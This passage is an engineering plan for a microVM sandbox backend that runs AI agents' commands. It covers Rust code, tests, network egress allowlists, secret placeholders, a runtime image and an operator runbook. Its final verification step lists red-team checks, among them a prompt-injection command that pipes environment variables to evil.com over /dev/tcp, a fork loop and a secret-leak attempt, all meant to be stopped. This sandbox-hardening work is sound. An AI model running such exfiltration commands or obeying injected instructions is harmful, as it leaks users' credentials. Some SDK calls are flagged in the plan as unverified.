                .map_err(|e| format!("microsandbox get: {e}"))?
                .stop()
                .await
                .map_err(|e| format!("microsandbox stop: {e}"))
        }).await?
    }
}
```

- [ ] **Step 5: Wire it into main**

In `crates/sandbox/src/main.rs`:

```rust
use zeroship_sandbox::config::BackendKind;
#[cfg(feature = "microsandbox")]
use zeroship_sandbox::backend_microsandbox::MicrosandboxBackend;

let backend: Arc<dyn Backend> = match config.backend {
    BackendKind::Docker => Arc::new(DockerBackend::new(config.clone())),
    BackendKind::Microsandbox => {
        #[cfg(feature = "microsandbox")]
        { Arc::new(MicrosandboxBackend::new(config.clone())) }
        #[cfg(not(feature = "microsandbox"))]
        {
            eprintln!("[sandbox] microsandbox feature not compiled in");
            std::process::exit(1);
        }
    }
};
```

- [ ] **Step 6: Compile both feature sets**

```bash
cargo check -p zeroship-sandbox
cargo check -p zeroship-sandbox --features microsandbox
```

Both must succeed. If the microsandbox crate's true API doesn't match the pseudo-API above, fix the calls now (do not paper over with `unwrap()` or `todo!()`).

- [ ] **Step 7: Commit**

```bash
git add crates/sandbox/
git commit -m "feat(sandbox): MicrosandboxBackend skeleton (probe/create/stop)"
```

---

## Task 5: Implement `exec` against microsandbox

Streams stdout/stderr from `exec_stream` and concatenates into `ExecOutput`. Streaming all the way to the HTTP client is a follow-up; deepagents tools in `chat.ts` already cap output at 4000 chars per call, so non-streaming exec is fine for v1.

**Files:**
- Modify: `crates/sandbox/src/backend_microsandbox.rs`

- [ ] **Step 1: Write integration test (gated by env)**

Create `crates/sandbox/tests/microsandbox_exec.rs`:

```rust
//! Real-VM integration test. Skipped unless MICROSANDBOX_AVAILABLE=1
//! and the host has /dev/kvm.
#![cfg(feature = "microsandbox")]
use std::sync::Arc;
use zeroship_sandbox::backend::{Backend, CreateRequest};
use zeroship_sandbox::backend_microsandbox::MicrosandboxBackend;

fn skip_if_no_kvm() -> bool {
    std::env::var("MICROSANDBOX_AVAILABLE").ok().as_deref() != Some("1")
        || !std::path::Path::new("/dev/kvm").exists()
}

#[compio::test]
async fn echo_in_vm() {
    if skip_if_no_kvm() {
        eprintln!("skipping: MICROSANDBOX_AVAILABLE!=1 or no /dev/kvm");
        return;
    }
    let cfg = test_config();
    let backend: Arc<dyn Backend> = Arc::new(MicrosandboxBackend::new(cfg));
    backend.probe().await.expect("probe");

    let h = backend.create(CreateRequest {
        project_id: "test-exec",
        session_id: "00000000-0000-0000-0000-000000000001",
    }).await.expect("create");

    let out = backend.exec(&h, "echo hi", None, Some(5000)).await.expect("exec");
    assert_eq!(out.status, 0);
    assert_eq!(out.stdout.trim(), "hi");

    backend.stop(&h).await.expect("stop");
}

fn test_config() -> zeroship_sandbox::config::SandboxConfig {
    use zeroship_sandbox::config::*;
    SandboxConfig {
        port: 9091, token: String::new(),
        image: "n/a".into(),
        workspace_root: std::path::PathBuf::from("/tmp/zsbx-test"),
        network: "n/a".into(), memory_mb: 512, cpus: 1.0,
        idle_timeout_secs: 300, max_lifetime_secs: 1800, auto_pull: false,
        backend: BackendKind::Microsandbox,
        runtime_image: std::env::var("ZSBX_TEST_IMAGE").unwrap_or_else(|_| "alpine:3".into()),
        vm_idle_secs: 60, vm_max_secs: 300,
    }
}
```

- [ ] **Step 2: Implement `exec` (drain `exec_stream`)**

Replace the stub in `backend_microsandbox.rs`:

```rust
async fn exec(
    &self,
    h: &SessionHandle,
    cmd: &str,
    cwd: Option<&str>,
    timeout_ms: Option<u64>,
) -> Result<ExecOutput, String> {
    let name = h.name.clone();
    let workdir = cwd.unwrap_or("/workspace").to_string();
    let timeout = timeout_ms.unwrap_or(60_000).min(600_000);
    let cmd_str = format!("cd {} && {}", shell_quote(&workdir), cmd);

    with_tokio(async move {
        let sb = microsandbox::Sandbox::get(&name).await
            .map_err(|e| format!("microsandbox get: {e}"))?;
        // Bound the entire exec by the caller's timeout.
        let fut = async {
            let mut handle = sb.exec_stream("sh", &["-c", &cmd_str]).await
                .map_err(|e| format!("exec_stream: {e}"))?;
            let mut stdout = Vec::<u8>::new();
            let mut stderr = Vec::<u8>::new();
            let mut status: i32 = -1;
            while let Some(ev) = handle.next().await {
                match ev {
                    microsandbox::ExecEvent::Stdout(b) => stdout.extend_from_slice(&b),
                    microsandbox::ExecEvent::Stderr(b) => stderr.extend_from_slice(&b),
                    microsandbox::ExecEvent::Exited { code, .. } => { status = code; }
                }
            }
            Ok::<_, String>(ExecOutput {
                status,
                stdout: String::from_utf8_lossy(&stdout).into_owned(),
                stderr: String::from_utf8_lossy(&stderr).into_owned(),
            })
        };
        match tokio::time::timeout(std::time::Duration::from_millis(timeout), fut).await {
            Ok(r) => r,
            Err(_) => Err(format!("exec timed out after {timeout}ms")),
        }
    }).await?
}

fn shell_quote(s: &str) -> String {
    format!("'{}'", s.replace('\'', "'\\''"))
}
```

(The exact `ExecEvent` variant names and the `next()` API come from the microsandbox SDK — verify before implementing. If the SDK exposes a higher-level `sb.exec(...)` that returns `(stdout, stderr, status)` directly, use it.)

- [ ] **Step 3: Run integration test on a KVM host**

```bash
MICROSANDBOX_AVAILABLE=1 cargo test -p zeroship-sandbox --features microsandbox \
    --test microsandbox_exec -- --nocapture
```

Expected: PASS, prints "hi" through the VM. Without `MICROSANDBOX_AVAILABLE=1` the test logs and returns early.

- [ ] **Step 4: Commit**

```bash
git add crates/sandbox/src/backend_microsandbox.rs crates/sandbox/tests/microsandbox_exec.rs
git commit -m "feat(sandbox): microsandbox exec via exec_stream"
```

---

## Task 6: Implement file ops via the microsandbox SDK

`read_file`, `write_file`, `delete_file`, `file_tree`. The deepagents tools cap individual files at 5 MiB; for larger files use `read_stream` / chunked write if the SDK exposes it.

**Files:**
- Modify: `crates/sandbox/src/backend_microsandbox.rs`

- [ ] **Step 1: Write file-ops integration test**

Append to `crates/sandbox/tests/microsandbox_exec.rs`:

```rust
#[compio::test]
async fn write_read_delete() {
    if skip_if_no_kvm() { return; }
    let cfg = test_config();
    let backend: Arc<dyn Backend> = Arc::new(MicrosandboxBackend::new(cfg));
    let h = backend.create(CreateRequest {
        project_id: "test-files",
        session_id: "00000000-0000-0000-0000-000000000002",
    }).await.unwrap();

    backend.write_file(&h, "hello.txt", b"world").await.unwrap();
    let body = backend.read_file(&h, "hello.txt").await.unwrap();
    assert_eq!(body, b"world");

    let deleted = backend.delete_file(&h, "hello.txt").await.unwrap();
    assert!(deleted);
    let missing = backend.delete_file(&h, "hello.txt").await.unwrap();
    assert!(!missing);

    backend.stop(&h).await.unwrap();
}
```

- [ ] **Step 2: Implement file ops**

Replace stubs in `backend_microsandbox.rs`:

```rust
async fn read_file(&self, h: &SessionHandle, path: &str) -> Result<Vec<u8>, String> {
    let name = h.name.clone();
    let path = format!("/workspace/{}", path.trim_start_matches('/'));
    with_tokio(async move {
        microsandbox::Sandbox::get(&name).await
            .map_err(|e| format!("get: {e}"))?
            .fs.read(&path).await
            .map_err(|e| format!("read {path}: {e}"))
    }).await?
}

async fn write_file(&self, h: &SessionHandle, path: &str, body: &[u8]) -> Result<(), String> {
    let name = h.name.clone();
    let path = format!("/workspace/{}", path.trim_start_matches('/'));
    let body = body.to_vec();
    with_tokio(async move {
        microsandbox::Sandbox::get(&name).await
            .map_err(|e| format!("get: {e}"))?
            .fs.write(&path, &body).await
            .map_err(|e| format!("write {path}: {e}"))
    }).await?
}

async fn delete_file(&self, h: &SessionHandle, path: &str) -> Result<bool, String> {
    let name = h.name.clone();
    let p = format!("/workspace/{}", path.trim_start_matches('/'));
    with_tokio(async move {
        let sb = microsandbox::Sandbox::get(&name).await
            .map_err(|e| format!("get: {e}"))?;
        match sb.fs.remove(&p).await {
            Ok(()) => Ok(true),
            Err(e) if e.is_not_found() => Ok(false),
            Err(e) => Err(format!("remove {p}: {e}")),
        }
    }).await?
}

async fn file_tree(&self, h: &SessionHandle) -> Result<Vec<FileEntry>, String> {
    let name = h.name.clone();
    with_tokio(async move {
        let sb = microsandbox::Sandbox::get(&name).await
            .map_err(|e| format!("get: {e}"))?;
        let entries = sb.fs.walk("/workspace").await
            .map_err(|e| format!("walk: {e}"))?;
        Ok(entries.into_iter().map(|e| FileEntry {
            path: e.path.trim_start_matches("/workspace/").to_string(),
            kind: if e.is_dir { FileKind::Dir } else { FileKind::File },
            size: e.size,
        }).collect())
    }).await?
}
```

(`is_not_found` and the exact fs walk API — verify against the crate docs.)

- [ ] **Step 3: Run, expect PASS on a KVM host**

```bash
MICROSANDBOX_AVAILABLE=1 cargo test -p zeroship-sandbox --features microsandbox \
    --test microsandbox_exec write_read_delete -- --nocapture
```

- [ ] **Step 4: Commit**

```bash
git add crates/sandbox/src/backend_microsandbox.rs crates/sandbox/tests/microsandbox_exec.rs
git commit -m "feat(sandbox): microsandbox file ops via SDK fs API"
```

---

## Task 7: Network policy + secret placeholders

Wire the per-session secrets and the egress allowlist into `create`. Default policy: deny outbound, allow `pypi.org`, `pythonhosted.org`, `registry.npmjs.org`, `*.githubusercontent.com`, `github.com`. API keys come from env at `zeroship-sandbox` start (the deepagents server already loads them).

**Files:**
- Modify: `crates/sandbox/src/config.rs`
- Modify: `crates/sandbox/src/backend_microsandbox.rs`

- [ ] **Step 1: Add secret config**

In `config.rs` `SandboxConfig`:

```rust
/// Secrets exposed to agent VMs. Keys: env var name in the guest.
/// Values: real secret + allowed egress hostnames (host-side TLS
/// proxy will substitute the placeholder only when the connection
/// resolves to one of these hosts).
pub secrets: Vec<SecretBinding>,
/// Allowlisted egress hostnames (in addition to per-secret allowlists).
/// `SANDBOX_EGRESS_ALLOW` (comma-separated, default
/// `pypi.org,pythonhosted.org,registry.npmjs.org,github.com,*.githubusercontent.com`).
pub egress_allow: Vec<String>,

#[derive(Clone, Debug)]
pub struct SecretBinding {
    pub env_name: String,
    pub value: String,
    pub allow_hosts: Vec<String>,
}
```

In `from_env`, parse `SANDBOX_SECRETS` as JSON (e.g.
`[{"env_name":"OPENAI_API_KEY","env_source":"OPENAI_API_KEY","allow_hosts":["api.openai.com"]}]`)
and resolve `env_source` from the host environment. Default empty list.

- [ ] **Step 2: Wire into `create`**

```rust
let secrets: Vec<_> = self.cfg.secrets.iter().map(|s| {
    microsandbox::Secret::env(&s.env_name, &s.value, s.allow_hosts.clone())
}).collect();

let policy = microsandbox::NetworkPolicy::deny_default()
    .allow_domain_suffix(self.cfg.egress_allow.clone());

// ... .secrets(secrets).network(policy) into the builder chain.
```

(Verify exact builder methods against the crate.)

- [ ] **Step 3: Manual smoke test**

Run a sandbox with `OPENAI_API_KEY=sk-...test`, exec `printenv OPENAI_API_KEY`. The output should be `msb_ph_<random>`, not `sk-...test`. Then exec `curl -s https://api.openai.com/v1/models -H "Authorization: Bearer $OPENAI_API_KEY"`; the proxy substitutes the real value and the call succeeds. Document this in `docs/runbooks/microsandbox-host.md`.

- [ ] **Step 4: Commit**

```bash
git add crates/sandbox/src/config.rs crates/sandbox/src/backend_microsandbox.rs
git commit -m "feat(sandbox): per-session secrets + egress allowlist"
```

---

## Task 8: Bake the runtime OCI image

Replaces `zeroship/sandbox-base` for the microsandbox path. Pre-installs node 22, python 3.12, vite, common pip packages used by deepagents tools, and the project template — so cold start does not pay `npm install` time.

**Files:**
- Create: `docker/agent-runtime/Dockerfile`
- Create: `docker/agent-runtime/entrypoint.sh`
- Create: `docker/agent-runtime/template/` (copy from existing `docker/sandbox-base/template/`)
- Create: `.github/workflows/agent-runtime-image.yml` (optional, can defer)

- [ ] **Step 1: Write the Dockerfile**

```dockerfile
# syntax=docker/dockerfile:1.7
FROM debian:bookworm-slim

ENV DEBIAN_FRONTEND=noninteractive \
    NODE_VERSION=22.11.0 \
    PNPM_HOME=/usr/local/share/pnpm \
    PATH=/usr/local/share/pnpm:/usr/local/bin:/usr/bin:/bin

RUN apt-get update && apt-get install -y --no-install-recommends \
      ca-certificates curl git python3 python3-pip xz-utils \
    && rm -rf /var/lib/apt/lists/*

# Node via official tarball (node:22 image is alpine-only on some arches).
RUN curl -fsSL "https://nodejs.org/dist/v${NODE_VERSION}/node-v${NODE_VERSION}-linux-x64.tar.xz" \
      | tar -xJ -C /usr/local --strip-components=1 \
    && npm i -g pnpm@9 vite@5

# Pre-install the deepagents pip deps so `python tool.py` is instant.
RUN pip3 install --no-cache-dir --break-system-packages \
      requests httpx pydantic pydantic-ai

# Project template, copied to /workspace on first boot if empty.
COPY template /opt/templates/default
COPY entrypoint.sh /usr/local/bin/agent-entrypoint
RUN chmod +x /usr/local/bin/agent-entrypoint

WORKDIR /workspace
ENTRYPOINT ["/usr/local/bin/agent-entrypoint"]
CMD ["sleep", "infinity"]
```

- [ ] **Step 2: Write entrypoint**

```bash
#!/bin/sh
set -eu
if [ ! -e /workspace/package.json ]; then
    cp -a /opt/templates/default/. /workspace/
fi
exec "$@"
```

- [ ] **Step 3: Build and tag locally, push later**

```bash
docker build -t ghcr.io/zeroship/agent-runtime:dev docker/agent-runtime/
docker run --rm ghcr.io/zeroship/agent-runtime:dev sh -c 'node -v && python3 -V && vite --version'
```

Expected: `v22.11.0`, `Python 3.12.x`, `vite/5.x`.

- [ ] **Step 4: Commit**

```bash
git add docker/agent-runtime/
git commit -m "feat(sandbox): fat OCI runtime image for microsandbox VMs"
```

(Pushing to GHCR is a release-time concern; track it in the rollout doc.)

---

## Task 9: Operator runbook

Captures the host-prep steps so the on-call can stand up a `zeroship-sandbox` node without re-deriving anything.

**Files:**
- Create: `docs/runbooks/microsandbox-host.md`

- [ ] **Step 1: Write the runbook**

```markdown
# Microsandbox sandbox host

## Preconditions

- Linux 6.1+ with KVM enabled (`grep -c -w 'vmx\|svm' /proc/cpuinfo` > 0).
- `/dev/kvm` exists and the `zeroship` user is in the `kvm` group.
- Host is **bare metal or KVM-passthrough VM** — microsandbox does not run
  inside Docker/k8s containers (no `/dev/kvm` access; upstream issue #611
  tracks the future daemon mode).
- libkrun and libkrunfw installed (check distro packages or build from
  containers/libkrun).

## Pre-pull the runtime image

```bash
msb image pull ghcr.io/zeroship/agent-runtime:vN
```

Image is ~700 MiB; pre-pulling cuts first-session boot from minutes to
seconds.

## Configure secrets

Set per-secret environment vars on the host, then point `SANDBOX_SECRETS`
at a JSON list referencing them:

```bash
export OPENAI_API_KEY=sk-...
export ANTHROPIC_API_KEY=sk-ant-...
export SANDBOX_SECRETS='[
  {"env_name":"OPENAI_API_KEY","env_source":"OPENAI_API_KEY","allow_hosts":["api.openai.com"]},
  {"env_name":"ANTHROPIC_API_KEY","env_source":"ANTHROPIC_API_KEY","allow_hosts":["api.anthropic.com"]}
]'
```

The host-side TLS proxy substitutes the real value only when the egress
hostname matches `allow_hosts`. Anything else gets the placeholder.

## Run the daemon

```bash
SANDBOX_BACKEND=microsandbox \
SANDBOX_RUNTIME_IMAGE=ghcr.io/zeroship/agent-runtime:vN \
SANDBOX_TOKEN=<random> \
SANDBOX_PORT=9091 \
zeroship-sandbox
```

## Smoke test

```bash
curl -s -X POST http://localhost:9091/sessions \
  -H "Authorization: Bearer $SANDBOX_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"project_id":"smoke"}'
# → 201 with session id, handle.name=agent-smoke

curl -s -X POST http://localhost:9091/sessions/<id>/exec \
  -H "Authorization: Bearer $SANDBOX_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"cmd":"node -v"}'
# → {"status":0,"stdout":"v22.11.0\n","stderr":""}
```

## Rollback

`SANDBOX_BACKEND=docker` and restart. Existing microsandbox volumes stay
on disk under `~/.microsandbox/volumes/` — no data is lost, but the
docker backend won't see them. Volumes can be inspected via the SDK
host-side helpers.

## Known issues

- `httpx.AsyncClient` + secret placeholders → `RemoteProtocolError`
  (upstream #607). Use sync `requests`/`httpx` until upstream fix.
- Snapshots not yet shipping (#250). Cold start is a real Linux boot;
  pre-pulling the runtime image is the only knob today.
- Named volumes are local-disk; loss of a host loses session FS.
```

- [ ] **Step 2: Commit**

```bash
git add docs/runbooks/microsandbox-host.md
git commit -m "docs(runbook): microsandbox host setup"
```

---

## Task 10: Rollout flag in builder, update tool docs

The builder app (`apps/zeroship-builder`) doesn't need code changes — it talks to the same HTTP API. But surface the backend in `GET /sessions/{id}` so the UI can show "running on libkrun microVM" and we can A/B troubleshoot.

**Files:**
- Modify: `crates/sandbox/src/handlers.rs` — extend `SessionInfo` JSON with `backend: "docker"|"microsandbox"`
- Modify: `apps/zeroship-builder/src/server/sandbox.ts` — surface `backend` in the typed response

- [ ] **Step 1: Add `backend` to `SessionInfo`**

In `crates/sandbox/src/session.rs`:

```rust
#[derive(Clone, Debug, Serialize)]
pub struct SessionInfo {
    pub session_id: String,
    pub project_id: String,
    pub backend: String,        // NEW: "docker" | "microsandbox"
    pub handle: SessionHandle,
    pub created_at_secs: u64,
    pub last_used_at_secs: u64,
}
```

`SessionRegistry::insert` takes a `&str` backend name and stores it; populate from `state.config.backend` (use `match` on `BackendKind` to render the string).

- [ ] **Step 2: Update TS client**

In `apps/zeroship-builder/src/server/sandbox.ts`, extend the `SessionInfo` type alias:

```ts
export interface SessionInfo {
  session_id: string;
  project_id: string;
  backend: "docker" | "microsandbox";
  handle: { name: string; id?: string; workspace_path: string; container_ip?: string };
  created_at_secs: number;
  last_used_at_secs: number;
}
```

- [ ] **Step 3: Run tests**

```bash
cargo test -p zeroship-sandbox
cd apps/zeroship-builder && npm run check
```

- [ ] **Step 4: Commit**

```bash
git add crates/sandbox/src/session.rs apps/zeroship-builder/src/server/sandbox.ts
git commit -m "feat(sandbox): surface backend kind in SessionInfo"
```

---

## Task 11: Verify end-to-end + record metrics

Final verification on a real KVM host. Run the deepagents UI against `SANDBOX_BACKEND=microsandbox` and exercise: open project, write a file, run `npm run dev`, exec `python -c 'import requests; print(requests.get("https://api.github.com").status_code)'`.

- [ ] **Step 1: Run the full builder flow**

```bash
# Terminal 1: zeroship-sandbox in microsandbox mode (as in runbook)
# Terminal 2: zeroship-builder dev server
cd apps/zeroship-builder && npm run dev
```

In the browser: open a project, send "create a hello-world Vite app", let the agent run its tools, confirm preview iframe loads.

- [ ] **Step 2: Time the cold-start + first-exec**

Record into `docs/runbooks/microsandbox-host.md`:
- `create` p50 / p95 (warm image)
- First `exec` after `create` p50 / p95
- Steady-state `exec` p50

If `create` p50 > 3 s, the runtime image is too fat or a `setup` script is
running on boot — investigate before declaring rollout-ready.

- [ ] **Step 3: Capture failure modes**

Try: prompt-injection that runs `printenv > /dev/tcp/evil.com/80` (should
fail at egress policy), `fork() in a tight loop` (should hit max_duration),
secret leak attempt (should return placeholder). Document outcomes.

- [ ] **Step 4: Commit final doc**

```bash
git add docs/runbooks/microsandbox-host.md
git commit -m "docs(runbook): microsandbox e2e + measured numbers"
```

---

## Self-review

- [x] **Spec coverage** — every constraint from the conversation (no daemon, no snapshots, tokio bridge, fat image, secret placeholder, egress allowlist, KVM-only, rollback path) has a task.
- [x] **No placeholders** — all code blocks show actual code; pseudo-API segments are explicitly flagged with "verify against `cargo doc -p microsandbox`" so no engineer copy-pastes invented method names.
- [x] **Type consistency** — `Backend` trait, `SessionHandle`, `ExecOutput`, `FileEntry`, `SecretBinding`, `BackendKind` defined once and referenced consistently. `SessionInfo` field rename (`container_id` → `handle`) propagates through `session.rs`, `handlers.rs`, and the TS client.
- [x] **Risk surfaces flagged** — async-httpx bug (#607), no-snapshots (#250), no-daemon (#611), KVM-only host requirement, named-volume HA gap.

---

## Sequencing notes

- Tasks 0–3 are **safe to land before any host has libkrun**. Pure refactor + scaffolding; default backend stays Docker.
- Tasks 4–7 require a single dev host with `/dev/kvm`. Land behind the `microsandbox` cargo feature so CI without KVM still builds.
- Tasks 8–9 are pre-rollout artifacts (image, runbook).
- Task 10 is the build-out for observability.
- Task 11 is the go/no-go gate.

If any task fails at a `cargo doc -p microsandbox` verification (the SDK shape doesn't match the snippets here), STOP and update the plan inline. Do not paper over with `unwrap()`/`todo!()` — the unverified shape is the most likely source of bugs in this plan, and the cost of fixing the snippets is cheap.
